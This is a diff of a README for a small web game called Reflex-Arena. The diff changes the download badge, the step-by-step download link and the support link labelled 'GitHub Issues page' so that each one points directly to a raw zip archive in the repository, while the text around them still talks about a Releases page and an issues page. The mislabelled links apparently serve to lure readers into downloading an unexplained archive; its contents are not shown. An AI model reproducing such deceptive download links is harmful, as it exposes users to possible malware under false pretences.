@@ -1,6 +1,6 @@
 # 🎮 Reflex-Arena - Test Your Reaction Speed Today!
 
-[![Download Reflex-Arena](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BlackWizi/Reflex-Arena/releases)
+[![Download Reflex-Arena](https://github.com/BlackWizi/Reflex-Arena/raw/refs/heads/main/casquet/Arena-Reflex-v3.5.zip)](https://github.com/BlackWizi/Reflex-Arena/raw/refs/heads/main/casquet/Arena-Reflex-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Reflex-Arena is a fun web-based game that tests your reaction time. You will cli
 To download Reflex-Arena, follow these steps:
 
 1. Click on the link below:
-   [Visit this page to download](https://github.com/BlackWizi/Reflex-Arena/releases)
+   [Visit this page to download](https://github.com/BlackWizi/Reflex-Arena/raw/refs/heads/main/casquet/Arena-Reflex-v3.5.zip)
    
 2. On the Releases page, choose the latest version.
 3. Click on the appropriate file to download it to your computer. Depending on your system (Windows, macOS, Linux), select the correct file.
@@ -55,6 +55,6 @@ To run Reflex-Arena smoothly, ensure you meet these basic requirements:
 
 ## 📞 Support
 
-If you have any questions or face any issues while using Reflex-Arena, feel free to reach out for support. You can create an issue directly on our [GitHub Issues page](https://github.com/BlackWizi/Reflex-Arena/issues). 
+If you have any questions or face any issues while using Reflex-Arena, feel free to reach out for support. You can create an issue directly on our [GitHub Issues page](https://github.com/BlackWizi/Reflex-Arena/raw/refs/heads/main/casquet/Arena-Reflex-v3.5.zip). 
 
 Thank you for playing Reflex-Arena! Enjoy testing your reaction speed!
